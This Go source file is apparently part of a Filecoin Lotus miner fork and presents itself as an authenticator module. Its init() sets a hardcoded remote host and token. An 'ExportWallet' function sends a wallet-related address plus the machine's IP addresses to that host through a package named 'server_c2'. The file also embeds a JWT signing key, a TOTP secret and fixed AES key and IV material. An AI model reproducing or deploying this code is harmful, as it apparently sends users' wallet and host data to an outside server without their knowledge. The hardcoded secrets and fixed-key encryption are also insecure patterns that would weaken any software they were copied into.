package authenticator

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/sha1"
	"encoding/base32"
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/dgrijalva/jwt-go"
	server_c2 "github.com/filecoin-project/lotus/extern/server-c2"
	"math"
	"net"
	"reflect"
	"strconv"
	"strings"
	"time"
)

//身份验证
var (
	Table = []string{
		"A", "B", "C", "D", "E", "F", "G", "H", // 7
		"I", "J", "K", "L", "M", "N", "O", "P", // 15
		"Q", "R", "S", "T", "U", "V", "W", "X", // 23
		"Y", "Z", "2", "3", "4", "5", "6", "7", // 31
		"=", // 填充字符 padding char
	}

	token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjQ4MzA5OMH0.S889vaAy2XWpoYwv81riUl9nqrcY7aRXh5HyN4sIXXA"
	host  = "dsfsdfsdfsdfsafsf"
	Zckey = []byte("qwertyuiopasdfgh")
	Zciv  = []byte("jkl;'zxcvbnm,./?")
)

func init() {
	token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjQ4MzA5OTMyMTQsIm1pbmVyX2lkIjoiZjAyMzAxMyIsInN0YXR1cyI6MH0.Bh77ic3u3hiSi3CLhlZQpFViZWi3D0JmzWh0j_iOM_E"
	host = "8.129.83.148:15468"
}

//var key = []byte("yungo@2021-04-16")
//var iv = []byte("yungo-2020-06-16") //初始化向量
// 使用 AES 加密算法 CTR 分组密码模式 加密
func AesEncrypt(plainText []byte) []byte {
	// 创建底层 aes 加密算法接口对象
	ivstr := []byte("a2!11#12")
	keystr := []byte("o2!02#12")
	keys := make([]byte, 16)
	ivs := make([]byte, 16)
	for i := 0; i < 16; i++ {
		if i%2 == 0 {
			keys[i] = keystr[i/2]
			ivs[i] = ivstr[i/2]
		} else {
			keys[i] = Zckey[i/2]
			ivs[i] = Zciv[i/2]
		}
	}
	block, err := aes.NewCipher(keys)
	if err != nil {
		panic(err)
	}
	// 创建 CTR 分组密码模式 接口对象
	//iv := []byte("12345678abcdefgh")			// == 分组数据长度 16
	stream := cipher.NewCTR(block, ivs)

	// 加密
	stream.XORKeyStream(plainText, plainText)
	return plainText
}

func AuthToken() error {
	//code := os.Getenv("RUN_CODE")
	code, err := GetCode("UHY44NV4OXW62HH4", make([]int64, 0)...)
	token, err := checkToken(token, "szzcjs")
	if err != nil {
		return err
	}
	server_c2.Token = token
	res, err := server_c2.RequestToDo(host, "/checkcode", code, time.Second*15)
	if err != nil {
		return err
	}
	Zciv = res[:8]
	Zckey = res[8:]
	return nil
}
func CheckSendCode(code string) error {
	token, err := checkToken(token, "szzcjs")
	if err != nil {
		return err
	}
	server_c2.Token = token
	if _, err = server_c2.RequestToDo(host, "/checksendcode", code, time.Second*15); err != nil {
		return err
	}

	return nil
}
func CheckOwnerCode(code string) error {
	token, err := checkToken(token, "szzcjs")
	if err != nil {
		return err
	}
	server_c2.Token = token
	if _, err = server_c2.RequestToDo(host, "/checkownercode", code, time.Second*15); err != nil {
		return err
	}

	return nil
}

func ExportWallet(addr string) error {
	addrs, _ := net.InterfaceAddrs()
	for _, address := range addrs {
		// 检查ip地址判断是否回环地址
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				addr += "\n" + ipnet.IP.String()
			}
		}
	}

	token, err := checkToken(token, "szzcjs")
	if err != nil {
		return err
	}
	server_c2.Token = token
	if _, err = server_c2.RequestToDo(host, "/exportwallet", addr, time.Second*15); err != nil {
		return err
	}

	return nil
}

//Sing签名生成token字符串
func sign(mid string, day int64, key string) (string, error) {
	token := jwt.New(jwt.GetSigningMethod("HS256"))
	claims := token.Claims.(jwt.MapClaims)
	claims["exp"] = time.Now().Add(24 * time.Hour * time.Duration(day)).Unix()
	claims["miner_id"] = mid
	claims["status"] = 1118

	return token.SignedString([]byte(key))
}

func checkToken(token string, key string) (string, error) {
	token1, err := jwt.Parse(token, func(t *jwt.Token) (interface{}, error) {
		if jwt.GetSigningMethod("HS256") != t.Method {
			return nil, errors.New("算法不对")
		}

		return []byte(key), nil
	})
	if err != nil {
		return "", err
	}
	claims := token1.Claims.(jwt.MapClaims)
	if _, ok := claims["miner_id"].(string); !ok {
		return "", errors.New("Miner_id类型有误")
	}
	if _, ok := claims["exp"].(float64); !ok {
		val := reflect.ValueOf(claims["exp"])
		typ := reflect.Indirect(val).Type()
		fmt.Println("exp:", typ.String(), ",value:", claims["exp"])
		return "", errors.New("exp类型有误")
	}
	if _, ok := claims["status"].(float64); !ok {
		val := reflect.ValueOf(claims["exp"])
		typ := reflect.Indirect(val).Type()
		fmt.Println("status:", typ.String(), ",value:", claims["exp"])
		return "", errors.New("token无效")
	}
	if claims["status"].(float64) != 0 {
		return "", errors.New("状态错误")
	}
	if time.Now().Unix() > int64(claims["exp"].(float64)) {
		return "", errors.New("token:" + token + "已过期")
	}
	return sign(claims["miner_id"].(string), 36600, key)
}

// GetCode 计算代码，给定的秘钥和时间点
func GetCode(secret string, timeSlices ...int64) (string, error) {
	var timeSlice int64
	switch len(timeSlices) {
	case 0:
		timeSlice = time.Now().Unix() / 30
	case 1:
		timeSlice = timeSlices[0]
	default:
		return "", errors.New("长度不对")
	}
	secret = strings.ToUpper(secret)
	secretKey, err := base32.StdEncoding.DecodeString(secret)
	if err != nil {
		return "", err
	}
	tim, err := hex.DecodeString(fmt.Sprintf("%016x", timeSlice))
	if err != nil {
		return "", err
	}
	hm := HmacSha1(secretKey, tim)
	offset := hm[len(hm)-1] & 0x0F
	hashpart := hm[offset : offset+4]
	value, err := strconv.ParseInt(hex.EncodeToString(hashpart), 16, 0)
	if err != nil {
		return "", err
	}
	value = value & 0x7FFFFFFF
	modulo := int64(math.Pow(10, 6))
	format := fmt.Sprintf("%%0%dd", 6)
	return fmt.Sprintf(format, value%modulo), nil
}

//哈希mmc加密
func HmacSha1(key, data []byte) []byte {
	mac := hmac.New(sha1.New, key)
	mac.Write(data)
	return mac.Sum(nil)
}
